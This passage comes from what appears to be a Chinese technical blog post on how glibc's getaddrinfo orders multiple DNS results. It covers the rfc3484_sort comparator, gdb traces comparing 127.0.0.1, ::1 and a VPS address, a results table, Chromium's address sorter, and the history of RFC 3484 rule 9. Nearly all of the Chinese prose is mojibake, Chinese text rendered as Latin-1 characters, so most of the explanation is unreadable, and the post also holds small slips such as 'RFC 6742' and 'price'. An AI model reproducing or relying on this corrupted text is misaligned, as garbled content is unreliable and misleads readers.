CommonPrefixLength é•¿ï¼Œé‚£ä¹ˆ CommonPrefixLength é•¿çš„åœ°å€æ”¾åœ¨å¦ä¸€ä¸ªåœ°å€ä¹‹å‰ã€‚ ä¿æŒé¡ºåºä¸å˜ã€‚æ²¡æœ‰è§„åˆ™é€‰æ‹©è¿™ä¸¤ä¸ªåœ°å€ä¸­è¾ƒå¥½çš„åœ°å€ï¼Œåˆ™å®ƒä»¬é€‰æ‹©æƒé‡ç›¸ç­‰ã€‚é€‰æ‹©ç¬¬ä¸€ä¸ªåœ°å€ä½œä¸ºè¿™ä¸¤ä¸ªåœ°å€ä¸­è¾ƒå¥½çš„åœ°å€ï¼Œé¡ºåºä¸å˜ã€‚  æˆ‘è®¤ä¸º RFC å†³å®šäº†ä»£ç åº”è¯¥æ€ä¹ˆå»æ‰§è¡Œï¼Œä½†æ˜¯ç»ˆç©¶è¿˜æ˜¯ä»£ç å†³å®šäº†æ€ä¹ˆå»æ‰§è¡Œã€‚ï¼ˆçº¯ç²¹æ˜¯æˆ‘ä¹Ÿæ²¡æ€ä¹ˆçœ‹æ‡‚\näºæ˜¯ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨è¿™é‡Œæ‰¾åˆ°getaddrinfoå‡½æ•°çš„å®ç°ï¼šhttps://code.woboq.org/userspace/glibc/sysdeps/posix/getaddrinfo.c.html#2479 ï¼Œå…³é”®ç‚¹å°±åœ¨è¿™ï¼Œå¯ä»¥çœ‹åˆ°åœ¨getaddrinfoå‡½æ•°æ‹¿åˆ°ç»“æœåä½¿ç”¨äº†rfc3484_sortå¯¹ç»“æœè¿›è¡Œæ’åºï¼š\n/* We got all the source addresses we can get, now sort using the information. */ struct sort_result_combo src = { .results = results, .nresults = nresults }; if (__glibc_unlikely (gaiconf_reload_flag_ever_set)) { __libc_lock_define_initialized (static, lock); __libc_lock_lock (lock); if (__libc_once_get (old_once) \u0026amp;\u0026amp; gaiconf_reload_flag) gaiconf_reload (); __qsort_r (order, nresults, sizeof (order[0]), rfc3484_sort, \u0026amp;src); __libc_lock_unlock (lock); } else __qsort_r (order, nresults, sizeof (order[0]), rfc3484_sort, \u0026amp;src); rfc3484_sortå‡½æ•°ä¸»è¦å®ç°å¯¹åº”äº† RFC 6742 å½“ä¸­çš„åæ¡è§„åˆ™ï¼š\nstatic int rfc3484_sort (const void *p1, const void *p2, void *arg) { //...ä»£ç æ®µè¿‡é•¿è¿™é‡Œçœç•¥  /* Rule 10: Otherwise, leave the order unchanged. To ensure this compare with the value indicating the order in which the entries have been received from the services. NB: no two entries can have the same order so the test will never return zero. */ return idx1 \u0026lt; idx2 ? -1 : 1; } rfc3484_sortçš„å‡½æ•°æ‰§è¡Œå®Œåï¼Œå›è°ƒåˆ°__qsort_rï¼Œä¹Ÿå°±æ˜¯qsort_r\n#define __qsort_r qsort_r  __qsort_r (order, nresults, sizeof (order[0]), rfc3484_sort, \u0026amp;src); æ¥ç€æŸ¥é˜…æ‰‹å†Œï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ° qsort_r å‡½æ•°çš„æè¿°ï¼š\n Synopsis\n#include \u0026lt;stdlib.h\u0026gt; void qsort(void *base, size_t nmemb, size_t size, int (*compar)(const void *, const void *)); void qsort_r(void *base, size_t nmemb, size_t size, int (*compar)(const void *, const void *, void *), void *arg); Feature Test Macro Requirements for glibc (see feature_test_macros(7)):\n qsort_r(): _GNU_SOURCE  Description\nThe qsort() function sorts an array with nmemb elements of size size. The base argument points to the start of the array.\nThe contents of the array are sorted in ascending order according to a comparison function pointed to by compar, which is called with two arguments that point to the objects being compared.\nThe comparison function must return an integer less than, equal to, or greater than zero if the first argument is considered to be respectively less than, equal to, or greater than the second. If two members compare as equal, their order in the sorted array is undefined.\nThe qsort_r() function is identical to qsort() except that the comparison function compar takes a third argument. A pointer is passed to the comparison function via arg. In this way, the comparison function does not need to use global variables to pass through arbitrary arguments, and is therefore reentrant and safe to use in threads.\n ä»ä¸­æˆ‘ä»¬å¯ä»¥æ˜ç™½ï¼Œqsort_r å‡½æ•°æ˜¯è¿”å›å‡åºçš„æ•°ç»„ç»“æœï¼Œå¹¶ä¸”å¯¹äºä½¿ç”¨çš„æ¯”è¾ƒå‡½æ•°çš„è¿”å›å€¼æ˜¯å¦å¤§äºé›¶æ¥å†³å®šä¼ é€’çš„å‚æ•°å¤§å°ï¼Œå¦‚æœè¿”å›å€¼å¤§äºé›¶ï¼Œæ„æ€å°±æ˜¯ç¬¬ä¸€ä¸ªå‚æ•°éœ€è¦æ’åœ¨ç¬¬äºŒä¸ªå‚æ•°ä¹‹åã€‚\næ¥ä¸‹æ¥æˆ‘ä»¬å°±å…·ä½“æ¥è°ƒè¯•ä¸€ä¸‹è¿™ä¸ªå‡½æ•°å§ï¼ŒæœŸé—´ setup ç­‰è°ƒè¯• glibc å¹¶éæœ¬æ–‡èŒƒå›´ï¼Œè€Œä¸”ç½‘ç»œä¹Ÿæœ‰æ¯”è¾ƒå¤šçš„æ–‡ç« ï¼Œè¿™é‡Œå°±ä¸å†åšè®°å½•ã€‚\nè¿™é‡Œæˆ‘ä»¬ä»¥ä¸€ä¸ª A è®°å½•ä¸º 127.0.0.1 ï¼Œå¦ä¸€ä¸ª A è®°å½•ä¸ºæˆ‘å…¶ä¸­ä¸€ä¸ª VPS åœ°å€ä¸ºä¾‹å­ï¼Œå…·ä½“æ¥çœ‹çœ‹è¿™ä¸ªå‡½æ•°çš„ä¸»è¦åˆ¤æ–­å½¢å¼ã€‚ gbd ç›´æ¥ä¸‹æ–­ç‚¹åˆ°rfc3484_sortï¼Œåœ¨è¿›å…¥åˆ°å‡½æ•°åï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä»¥ä¸‹å½¢å¼æŸ¥çœ‹ç›¸åº”çš„åœ°å€ï¼š\n(gdb) p ((struct sockaddr_in*)((*a1-\u0026gt;dest_addr)-\u0026gt;ai_addr))-\u0026gt;sin_addr $3 = {s_addr = 3183758381} (gdb) p ((struct sockaddr_in*)((*a2-\u0026gt;dest_addr)-\u0026gt;ai_addr))-\u0026gt;sin_addr $4 = {s_addr = 16777343} å¾—åˆ° a1 ä¸ a2 ä»£è¡¨çš„åœ°å€åï¼Œè½¬æˆåè¿›åˆ¶åå†å€’å™ä¸€ä¸‹ï¼Œå³ a2 ä»£è¡¨çš„æ˜¯ 127.0.0.1 ï¼Œ a1 ä»£è¡¨çš„æ˜¯æˆ‘ä»¬çœŸæ­£ vps çš„åœ°å€ã€‚ç„¶åé€šè¿‡ gdb å•æ­¥æ‰§è¡Œï¼Œæˆ‘ä»¬åœ¨ Rule 8 çš„æ—¶å€™è·³å‡ºäº†rfc3484_sortå‡½æ•°:\n/* Rule 8: Prefer smaller scope. */ if (a1_dst_scope \u0026lt; a2_dst_scope) return -1; if (a1_dst_scope \u0026gt; a2_dst_scope) return 1;  \nè·³å‡ºrfc3484_sortè¿›å…¥åˆ° qsort_r å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯åœ¨æ­¤å¤„æ‰§è¡Œå®Œæ¯”è¾ƒå°±ç›´æ¥è¿”å›åˆ°äº†qsortå‡½æ•°ï¼Œå¹¶ä¸”ä»æ‰§è¡Œç»“æœæ¥çœ‹ï¼Œæ˜¯å› ä¸º a1_dst_scope \u0026gt; a2_dst_scope æ¯”è¾ƒç»“æœæ‰§è¡Œäº†return 1ã€‚æ‰€ä»¥æŒ‰ç…§qsortå‡½æ•°æ–‡æ¡£è¯´æ˜ï¼Œå¦‚æœè¿”å›äº†ä¸€ä¸ªå¤§äº 0 çš„å€¼ï¼Œåˆ™è¯´æ˜è¦å°†ç¬¬ä¸€ä¸ªå‚æ•°éœ€è¦æ’åœ¨ç¬¬äºŒä¸ªå‚æ•°ä¹‹åï¼Œè¿™é‡Œ a1 ä»£è¡¨çš„æˆ‘ä»¬çš„ vps åœ°å€éœ€è¦æ’åœ¨ a2 ä»£è¡¨çš„ 127.0.0.1 åœ°å€ä¹‹åï¼Œæ‰€ä»¥ç»è¿‡rfc3484_sortå‡½æ•°è¿”å›çš„é¡ºåºåˆ™æ˜¯ 127.0.0.1 ä½œä¸ºé¦–é€‰åœ°å€ï¼ŒVPS åœ°å€å…¶æ¬¡ã€‚\näºæ˜¯æˆ‘æ¥ä¸‹æ¥ä¾æ¬¡å¯¹ IPv4 å½“ä¸­å„ç§æ’åˆ—ç»„åˆè¿›è¡Œäº†æµ‹è¯•ï¼š\n  a1 127.0.0.1 vs a2 0.0.0.0ã€‚é€‚ç”¨äº scope åˆ¤æ–­ï¼Œ127 ä¼˜å…ˆ\n  a1 ipv4 vps vs a2 0.0.0.0ã€‚é€‚ç”¨äº scope åˆ¤æ–­ï¼Œipv4 vps ä¼˜å…ˆ\n  a1 169.254.1.1 vs a2 0.0.0.0ã€‚é€‚ç”¨äº scope åˆ¤æ–­ï¼Œ169 ä¼˜å…ˆ\n  a1 127.0.0.1 vs a2 169.254.0ã€‚é€‚ç”¨äº scope åˆ¤æ–­ï¼Œ127 ä¼˜å…ˆ\n  a1 ipv4 vps vs a2 ipv4 vpsã€‚å¹¶ä¸é€‚ç”¨ä»»ä½•åˆ¤æ–­ï¼Œå‡½æ•°æ‰§è¡Œå®Œæˆè¿”å› -1 ï¼Œè¡¨ç¤ºä¿æŒåŸé¡ºåºï¼Œä½“ç°ä¸ºéšæœºã€‚\n  å†æ¬¡é‡ç”³ï¼Œè¿™é‡Œçš„ IPv6 æŒ‡çš„æ˜¯IPv4-mapped IPv6 addresses è¿™ç±»åœ°å€\nå¯¹äº IPv6 æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¦‚ä¸‹å½¢å¼åœ¨ gdb æ‰“å°å¯¹åº”çš„åœ°å€ï¼š\np ((struct sockaddr_in6*)((*a1-\u0026gt;dest_addr)-\u0026gt;ai_addr))-\u0026gt;sin6_addr-\u0026gt;__in6_u-\u0026gt;__u6_addr8 äºæ˜¯æˆ‘æ¥ä¸‹æ¥ä¾æ¬¡å¯¹ IPv4 ä¸ IPv6 å½“ä¸­å„ç§æ’åˆ—ç»„åˆè¿›è¡Œäº†æµ‹è¯•ï¼š\n IPv6 vps vs IPv4 vpsã€‚å¹¶ä¸é€‚ç”¨ä»»ä½•åˆ¤æ–­ï¼Œå‡½æ•°æ‰§è¡Œå®Œæˆè¿”å› -1 ï¼Œè¡¨ç¤ºä¿æŒåŸé¡ºåºï¼Œä½“ç°ä¸ºéšæœºã€‚ IPv6 vps vs 127.0.0.1ã€‚é€‚ç”¨äº scope åˆ¤æ–­ï¼Œ127 ä¼˜å…ˆ ::1 vs 45.76.196.189ã€‚é€‚ç”¨äº prec åˆ¤æ–­ï¼Œ::1 ä¼˜å…ˆ ::1 vs 127.0.0.1ã€‚é€‚ç”¨äº prec åˆ¤æ–­ï¼Œ::1 ä¼˜å…ˆ 127.0.0.1 vs :: ã€‚é€‚ç”¨äº scope åˆ¤æ–­ï¼Œ :: ä¼˜å…ˆ 0.0.0.0 vs IPv6 vpsã€‚é€‚ç”¨äº scope åˆ¤æ–­ï¼Œ IPv6 VPS ä¼˜å…ˆã€‚ 0.0.0.0 vs ::1ã€‚é€‚ç”¨äº scope åˆ¤æ–­ï¼Œ::1 ä¼˜å…ˆ IPv4 vps vs ::ã€‚é€‚ç”¨äº scope åˆ¤æ–­ï¼ŒIPv4 vps ä¼˜å…ˆ IPv4 vps vs ::1ã€‚é€‚ç”¨äº price åˆ¤æ–­ï¼Œ ::1 ä¼˜å…ˆ  æ€»ç»“èµ·æ¥æˆ‘ä»¬å¯ä»¥å¾—åˆ°ä»¥ä¸‹è¿™ä¸ªè¡¨æ ¼ï¼š\n   å¯¹æ¯”å½¢å¼ A1 A2 ä¼˜å…ˆå€¼     v4127-v40 127.0.0.1 0.0.0.0 A1   v4vps-v40 vps 0.0.0.0 A1   v4vps-v4127 127.0.0.1 vps A1   v4vps-v4vps vps vps éšæœºï¼Œä¿æŒåŸé¡ºåº   v4vps-v6vps vps vps éšæœºï¼Œä¿æŒåŸé¡ºåº   v4127-v6vps 127.0.0.1 vps A1   v4127-v60 127.0.0.1 :: A1   v4127-v6127 127.0.0.1 ::1 A2   v40-v6vps 0.0.0.0 vps A2   v40-v6127 0.0.0.0 ::1 A2   v4vps-v6127 vps ::1 A2   v4vps-v60 vps :: A1   V4127map-v4ps vps ::ffff:7f00:0001 éšæœºï¼Œä¿æŒåŸé¡ºåº    æ•´ä½“æ¥è¯´ï¼Œæˆ‘ä»¬å¯ä»¥å¤§è‡´ä»è¡¨ä¸­çœ‹å‡ºï¼Œå«æœ‰åŒ A è®°å½•çš„æƒ…å†µï¼Œå¦‚æœå‡ºç° 127.0.0.1 æˆ–è€… ::1 ï¼Œéƒ½ä¼šä»¥è¿™ä¸¤è€…ä¼˜å…ˆï¼Œè€Œä¸¤è€…ä¸­åˆä¼šä»¥ ::1 ä¼˜å…ˆï¼Œæ‰€ä»¥å¯¹äºå‰æ–‡çš„ IP é€‰æ‹©æ’åºé—®é¢˜æˆ‘ä»¬è¿™é‡Œä¹Ÿå°±å¾—åˆ°äº†ä¸€ä¸ªå¤§ä½“çš„ç­”æ¡ˆã€‚\n{% colorquote success %}\n2021/05/14 æ›´æ–°ï¼š\nå¢åŠ äº† 127.0.0.1 ä½¿ç”¨ IPv4-mapped è¡¨ç¤º IPv6 æ—¶ï¼Œä¸ v4 vps åœ°å€çš„å¯¹æ¯”ï¼Œè¯¦ç»†è¯´æ˜è§ Additional Remarks\n{% endcolorquote %}\nIP Sort IN Chromium å½“ç„¶åœ¨ Chromium ä¸­ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥çœ‹åˆ°ç›¸åº”çš„ IP é€‰æ‹©å®ç°æ–¹å¼ï¼š\nhttps://source.chromium.org/chromium/chromium/src/+/master:net/dns/address_sorter_posix.cc;l=39\n// Address sorting is performed according to RFC3484 with revisions. // http://tools.ietf.org/html/draft-ietf-6man-rfc3484bis-06 // Precedence and label are separate to support override through /etc/gai.conf.  // Returns true if |p1| should precede |p2| in the table. // Sorts table by decreasing prefix size to allow longest prefix matching. bool ComparePolicy(const AddressSorterPosix::PolicyEntry\u0026amp; p1, const AddressSorterPosix::PolicyEntry\u0026amp; p2) { return p1.prefix_length \u0026gt; p2.prefix_length; } åœ¨ https://source.chromium.org/chromium/chromium/src/+/master:net/dns/address_sorter_posix.cc;l=200 ä¹Ÿå®ç°äº†åŸºäº RFC 3484 å¯¹åº”çš„ IP æ’åºæ–¹æ³•ã€‚\nä½†æ˜¯å®é™…æµ‹è¯•ä¸­ï¼Œ chrome æœ‰ä¸ªéå¸¸å¥‡ç‰¹çš„ç°è±¡ï¼Œå°±æ˜¯å¯¹äºè¿”å›å¤šä¸ª IP ï¼Œchrome ä¼šç«‹é©¬æŒ¨ä¸ªå¯¹å…¶å‘èµ·è¯·æ±‚ï¼Œæˆ‘æ‰¾äº†ä¸€äº›æœ‹å‹è¯¢é—®äº†ç›¸å…³æƒ…å†µï¼Œæœ‰äº›è¡¨ç¤ºæ²¡æœ‰å…³æ³¨è¿‡ï¼Œæœ‰ä½æœ‹å‹åˆ™è¡¨ç¤ºä»–è¿‡å»å‘ç°è¿‡è¿™ä¸ªæƒ…å†µï¼Œè¯´æ˜¯ chrome æœ‰ä¸ª IP é€‰ä¼˜çš„æƒ…å†µï¼Œä¼šå¯¹å¤šä¸ª IP è¿›è¡Œæµ‹é€Ÿï¼Œä»¥æœ€å¿«çš„ç»“æœä½œä¸ºæœ€ä½³é€‰æ‹©ã€‚å…³äºè¿™ä¸ªç»“è®ºæˆ‘åœ¨ chromium.org ç­‰ç›¸å…³æ–‡æ¡£è¿›è¡Œäº†æŸ¥æ‰¾ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰æ‰¾åˆ°å…³äºè¯¥ç°è±¡çš„è¯´æ˜ã€‚å¦‚æœæœ‰æœ‹å‹çŸ¥é“è¯¥ç°è±¡çš„åŸå› æˆ–è€…ç›¸å…³ä¿¡æ¯çš„è¯ï¼Œä¹Ÿæ¬¢è¿æå‡ºè¯„è®ºã€‚\nSomething else Bad-behaved Application åœ¨ RFC 6724 å½“ä¸­ï¼Œæœ‰ç€è¿™ä¹ˆä¸€æ®µè¯\n â€‹\tWell-behaved applications SHOULD NOT simply use the first address returned from an API such as getaddrinfo() and then give up if it fails. For many applications, it is appropriate to iterate through the list of addresses returned from getaddrinfo() until a working address is found. For other applications, it might be appropriate to try multiple addresses in parallel (e.g., with some small delay in between) and use the first one to succeed.\n ä¹Ÿå°±æ˜¯è¯´åº”ç”¨ç¨‹åºä¸åº”è¯¥ç®€å•åœ°ä½¿ç”¨ä» APIï¼ˆå¦‚getaddrinfoï¼‰è¿”å›çš„ç¬¬ä¸€ä¸ªåœ°å€ï¼Œå¤±è´¥äº†å°±æ”¾å¼ƒæ”¹åœ°å€ã€‚å¯¹äºè®¸å¤šåº”ç”¨ç¨‹åºæ¥è¯´ï¼Œå®ƒä»¬éƒ½é€‰æ‹©ä»getaddrinfoè¿”å›çš„åœ°å€åˆ—è¡¨ä¸­è¿›è¡ŒæŒ¨ä¸ªæµ‹è¯•ï¼Œç›´åˆ°æ‰¾åˆ°ä¸€ä¸ªæ­£å¸¸çš„åœ°å€ã€‚å¯¹äºå…¶ä»–åº”ç”¨ç¨‹åºï¼Œå¯èƒ½é€‚åˆå¹¶è¡Œå°è¯•å¤šä¸ªåœ°å€ï¼ˆä¾‹å¦‚ï¼Œä¸­é—´æœ‰ä¸€äº›å°çš„å»¶è¿Ÿï¼‰ï¼Œå¹¶ä½¿ç”¨ç¬¬ä¸€ä¸ªåœ°å€æˆåŠŸã€‚(å¯èƒ½ Chrome å°±æ˜¯åŸºäºè¿™ä¸ªè¡¨ç°)\nç„¶è€Œ curl å°±æ˜¯è¿™ä¹ˆä¸€ä¸ª Bad-behaved Application ï¼Œä»getaddrinfoå‡½æ•°ä¸­å–å¾—çš„åœ°å€é“¾è¡¨ï¼Œä¾æ¬¡æŒ¨ä¸ªå»ºç«‹è¿æ¥ï¼Œä¸€ä¸ªä¸è¡Œå°±æ¢ä¸‹ä¸€ä¸ªç›´åˆ°æˆåŠŸæˆ–é“¾è¡¨ä¸ºç©ºä¸ºæ­¢ã€‚\nSome History of getaddrinfo ä¸€æ®µå…³äº getaddrinfo æ’åºæœ‰è¶£çš„å†å²ï¼Œä»¥ä¸‹æ˜¯ä¸ªäººå¯¹å…¶æŠ½å–çš„ç†è§£ï¼ŒåŸæ–‡è§ï¼šglibc\u0026rsquo;s getaddrinfo() sort order\nåœ¨è¿‡å»ï¼Œä¸»æœºååˆ° IP åœ°å€çš„æŸ¥è¯¢åˆ°ä¸€èˆ¬éƒ½æ˜¯ç”¨gethostbynameæ¥å®Œæˆçš„ï¼Œgethostbynameçš„åœ°å€æ˜¯æŒ‰ç…§æœåŠ¡å™¨è¿”å›çš„åœ°å€é¡ºåºæ’åˆ—çš„ï¼ˆé™¤éåœ¨æœ¬åœ°åšäº†ç‰¹æ®Šçš„é…ç½®ï¼‰ã€‚å½“ä¸€ä¸ªæŸ¥è¯¢æœ‰å¤šä¸ªåœ°å€æ—¶ï¼ŒåŸºæœ¬ä¸Šæ‰€æœ‰ NS æœåŠ¡å™¨éƒ½ä¼šå®‰æ’å¯¹è¿”å›çš„åœ°å€è¿›è¡Œ\u0026quot;è½®æµ \u0026ldquo;æˆ– \u0026ldquo;å¾ªç¯\u0026rdquo;ï¼šæ¯ä¸ªæŸ¥è¯¢éƒ½ä¼šå¾—åˆ°ä¸€ä¸ªæ–°çš„æ’åºã€‚è¿™æ˜¯ä¸ºäº†è®©ä¸€ä¸ªæœåŠ¡åå¯ä»¥å¼•ç”¨å¤šä¸ªç‰©ç†ç½‘ç»œæ¥å£ï¼ˆæˆ–è®¸åœ¨ä¸åŒçš„ä¸»æœºä¸Šï¼‰ï¼Œå¹¶åœ¨è¿™äº›æ¥å£ä¸Šåˆ†æ‹…è´Ÿè½½ï¼Œè¿™å°±æ˜¯æ‰€è°“çš„ \u0026ldquo;åŸºäºDNSçš„è´Ÿè½½å‡è¡¡\u0026rdquo;ã€‚å¦‚æœåè®®æ˜¯åƒé‚®ä»¶è¿™æ ·çš„åè®®ï¼Œå¦‚æœç¬¬ä¸€ä¸ªåœ°å€ä¸æˆåŠŸï¼Œå‘é€è€…å¯èƒ½ä¼šå°è¯•å¤šä¸ªåœ°å€ï¼Œè¿™ä¹Ÿç»™äº†ä½ ä¸€ä¸ªæ•…éšœè½¬ç§»(failover)ã€‚\ngethostbyname ç†è®ºä¸Šå¯ä»¥æ”¯æŒ IPv6 ï¼Œä½†æ¯æ¬¡è°ƒç”¨åªèƒ½è¿”å›ä¸€ç§åœ°å€ç±»å‹ã€‚è™½ç„¶æœ‰ä¸€ç§æ–¹æ³•å¯ä»¥å°† IPv4 åœ°å€åµŒå…¥åˆ° IPv6 åœ°å€ä¸­ï¼Œä½†å¯¹äºè¿™æ ·çš„æƒ…å†µï¼Œæ²¡æœ‰æ˜ç¡®çš„æ–¹æ³•å‘Šè¯‰ gethostbyname ï¼Œè°ƒç”¨çš„åº”ç”¨ç¨‹åºï¼ˆä»¥åŠåº”ç”¨ç¨‹åºæ‰€ä¾èµ–çš„å…¶ä»–å †æ ˆï¼‰å°†åº”å¯¹å¾—åˆ°ä¸€å † AF_INET6 è€Œä¸æ˜¯ AF_INET çš„è¿”å›ã€‚å› æ­¤å¯¹äº IPv6 ï¼Œéœ€è¦ä¸€ä¸ªæ–°çš„æ¥å£ã€‚è¿™ä¸ªæ¥å£ï¼ˆåœ¨ RFC3493 s6.1å’Œå®ƒçš„å‰èº«ä¸­å®šä¹‰ï¼‰å°±æ˜¯ getaddrinfo ã€‚\nå®ƒæœ‰å‡ ä¸ªæ–°ç‰¹æ€§ï¼Œå…¶ä¸­å¤§éƒ¨åˆ†ä¸è¿™é‡Œæ— å…³ã€‚å…³é”®çš„æ–°åŠŸèƒ½æ˜¯ï¼šgetaddrinfo å…è®¸åº”ç”¨ç¨‹åºæŒ‡å®šå®ƒæ˜¯å¦åªæƒ³è·å¾— IPv4 åœ°å€ï¼Œè¿˜æ˜¯ä¹Ÿæƒ³è·å¾— IPv6 åœ°å€ï¼Œå¦‚æœè·å¾—æ··åˆçš„åœ°å€ï¼Œé‚£ä¹ˆæ˜¯å°†å…¶ç¼–ç ä¸º AF_INET ï¼Œè¿˜æ˜¯å°†å…¶ç¼–ç ä¸º \u0026ldquo;v6-mapped \u0026ldquo;AF_INET6ï¼ˆè¿™é‡Œå°±æ˜¯ IPv4-mapped IPv6 Addresses ï¼‰ã€‚ç»“åˆå…¶ä»–å„ç§æ–°çš„ç‰¹ç‚¹ï¼Œè¿™ä½¿å¾—å°†ä¸€ä¸ªä»…æœ‰ IPv4 çš„åº”ç”¨ç¨‹åºè½¬æ¢ä¸º IPv6 åŠŸèƒ½å˜å¾—ç›¸å½“ç®€å•ã€‚æ‰€ä»¥ï¼Œæ€»çš„æ¥è¯´ï¼šgetaddrinfo æ˜¯ç”¨æ¥å–ä»£ gethostbyname çš„ã€‚\nç„¶è€Œï¼Œå¦å¤–ï¼Œäººä»¬æ„è¯†åˆ°ï¼Œå¦‚æœ getaddrinfo å¯ä»¥è¿”å› IPv4 å’Œ v6 åœ°å€çš„æ··åˆç‰©ï¼Œé‚£ä¹ˆæœ‰å¿…è¦æŒ‡å®šå®ƒä»¬çš„è¿”å›é¡ºåºã€‚å½“ RFC3484 ç¼–å†™æ—¶ï¼Œä½œè€…æ˜¾ç„¶è®¤ä¸ºæœ€å¥½çš„æ–¹æ³•æ˜¯åœ¨æ‰€æœ‰åœ°å€ä¸Šå®šä¹‰ä¸€ä¸ªæ¯”è¾ƒå‡½æ•°ï¼Œå®ƒå°†å®šä¹‰å“ªä¸ªåœ°å€æ˜¯é¦–é€‰ã€‚ RFC3484 çš„ä½œè€…ä¸ç®¡ä¸Šé¢æ‰€æè¿°çš„å¯¹ DNS å¾ªç¯åŠŸèƒ½çš„å½±å“ï¼ŒæŒ‡å®šï¼ˆç¬¬6æ¡è§„åˆ™9ï¼‰æ‰€æœ‰åœ°å€åº”è¯¥æŒ‰ç…§ä¸åšå‡ºé€‰æ‹©çš„ä¸»æœºçš„ \u0026ldquo;æ¥è¿‘åº¦ \u0026ldquo;è¿›è¡Œæ’åº\u0026ndash;å…¶ä¸­ \u0026ldquo;æ¥è¿‘åº¦ \u0026ldquo;è¢«å®šä¹‰ä¸ºæ™®é€šåˆå§‹åœ°å€å‰ç¼€çš„é•¿åº¦ã€‚\nè¿™åœ¨ 3484 åˆ¶å®šä¹‹æ—¶ï¼Œå¯¹äº IPv6 çš„çœŸå®ç½‘ç»œè¿‘ä¼¼æ€§å¯èƒ½æ˜¯ä¸€ä¸ªæœ‰äº‰è®®çš„å®šä¹‰ï¼Œä½†ç°åœ¨å¾ˆæ˜æ˜¾ï¼Œåœ¨çœŸå®çš„IPv6äº’è”ç½‘ä¸­ï¼Œå®ƒä¸æ˜¯è¿™æ ·çš„è¡¡é‡æ ‡å‡†ï¼Œåœ¨IPv4äº’è”ç½‘ä¸­ä¹Ÿä»æ¥æ²¡æœ‰è¿™æ ·çš„è¡¡é‡æ ‡å‡†ã€‚æ‰€ä»¥ RFC3484 s6 è§„åˆ™ 9 å°±æ˜¯é”™è¯¯çš„ï¼Œå› ä¸ºå®ƒèƒŒåçš„åŸå› å³ä½¿æ›¾ç»é€‚ç”¨ç°åœ¨ä¹Ÿä¸å†é€‚ç”¨äº†ã€‚ç„¶è€Œï¼Œæ¯”è¿™æ›´ç³Ÿç³•çš„æ˜¯ï¼šè§„åˆ™ 9ã€‚è¯•å›¾æ”¹å˜ç°æœ‰ç³»ç»Ÿçš„è¡Œä¸ºã€‚å¦‚æœæˆ‘ä»¬åŒæ„è§„åˆ™ 9ï¼Œé‚£ä¹ˆå®ƒä¹Ÿåº”è¯¥åŒæ ·é€‚ç”¨äºä½¿ç”¨ gethostbynameã€‚çš„åº”ç”¨ç¨‹åºã€‚æ‰€æœ‰ä½¿ç”¨ gethostbyname çš„ç°æœ‰åº”ç”¨ç¨‹åºéƒ½ä¸ç¬¦åˆè§„åˆ™9ã€‚ä¹Ÿè®¸å¯ä»¥ä¿®æ”¹ gethostbynameï¼Œä½¿å…¶æ ¹æ® RFC3484 s5 å’Œ s6 å¯¹åœ°å€è¿›è¡Œæ’åºã€‚ä½†è¿™æ˜¯ä¸€ä¸ªå¥½ä¸»æ„å—ï¼Ÿä¸ï¼Œæ˜¾ç„¶ä¸æ˜¯ã€‚è¿™å°†æ”¹å˜æ‰€æœ‰ç›®å‰ä½¿ç”¨ gethostbyname çš„åº”ç”¨ç¨‹åºçš„è¡Œä¸ºã€‚ç›®å‰ï¼Œè¿™äº›åº”ç”¨ç¨‹åº \u0026ldquo;éšæœº \u0026ldquo;åœ°é€‰æ‹©åœ°å€ï¼ˆæ ¹æ® DNS å¾ªç¯ï¼‰ã€‚è§„åˆ™ 9 ä¼šè®©åº”ç”¨ç¨‹åºæ ¹æ®æœ€é•¿é€šç”¨å‰ç¼€æ¥é€‰æ‹©åœ°å€ï¼Œè¿™å°†ç ´ååŸºäº DNS çš„è´Ÿè½½å‡è¡¡æœºåˆ¶ã€‚é‚£ä¹ˆ getaddrinfo å‘¢ï¼Ÿ æˆ‘ä»¬æ²¡æœ‰ç†ç”±ä¸ºäº†å¢åŠ æ–°åŠŸèƒ½å½»åº•åœ°æ”¹å˜è¯¥ API ã€‚äº‹å®ä¸Šï¼Œæˆ‘ä»¬çœ‹åˆ°ï¼Œæˆ‘ä»¬è‡ªå·±æœåŠ¡å™¨çš„ DNS è´Ÿè½½å‡è¡¡å·²ç»è¢«è¿™ä¸ªå˜åŒ–æ‰“ç ´äº†! ä¹Ÿå°±æ˜¯è¯´ï¼Œåº”ç”¨ç¨‹åºä»ä½¿ç”¨éè§„åˆ™ 9 çš„ gethostbyname æ”¹ä¸ºè§„åˆ™ 9 çš„ getaddrinfo ï¼ŒæœåŠ¡å™¨ä¼šå‡ºç°æ¯”è¾ƒä¸¥é‡çš„éè´Ÿè½½å‡è¡¡ã€‚\nRFC è¯•å›¾è§„å®šä»¥å¯é¢„æµ‹çš„é¡ºåºè¿”å›åœ°å€æ˜¯ä¸åˆç†çš„ï¼Œå› ä¸ºå‡ åå¹´æ¥æ•´ä¸ªäº’è”ç½‘æ‰€ä¾èµ–çš„æ—¢å®šè¡Œä¸ºæ˜¯åœ°å€ä¸æ˜¯ä»¥å¯é¢„æµ‹çš„é¡ºåºè¿”å›çš„ï¼Œå¹¶ä¸”è¿™é‡Œçš„ä¸å¯é¢„æµ‹æ€§ä¸æ˜¯å¶ç„¶çš„ã€‚åœ¨ DNS è½®è¯¢å‡ºç°ä¹‹å‰ï¼Œåœ°å€æ€»æ˜¯æŒ‰ç…§ DNS åŒºåŸŸç®¡ç†å‘˜æŒ‡å®šçš„é¡ºåºè¿”å›ï¼Œç‰¹æ®Šçš„ä»£ç è¢«æ·»åŠ åˆ° namervers ä¸­ (å‡ åå¹´å‰)ï¼Œä»¥ \u0026ldquo;éšæœºåŒ– \u0026ldquo;è¿™ä¸ªé¡ºåºã€‚ getaddrinfo ä¸åº”è¯¥å–æ¶ˆè¿™ä¸ªæªæ–½ã€‚æ­£å¦‚ä¸Šé¢æ‰€å±•ç¤ºçš„ï¼ŒRFCæ˜¯é”™è¯¯çš„ï¼Œä¸ç°æœ‰çš„å®è·µä¸ä¸€è‡´ï¼Œè€Œä¸”æ‰€æå‡ºçš„éµå®ˆå®ƒçš„æ–¹å¼å¯¼è‡´æˆ‘ä»¬æœ‰ä¸¤ä¸ªç±»ä¼¼çš„æ¥å£ï¼ˆ gethostbyname å’Œ 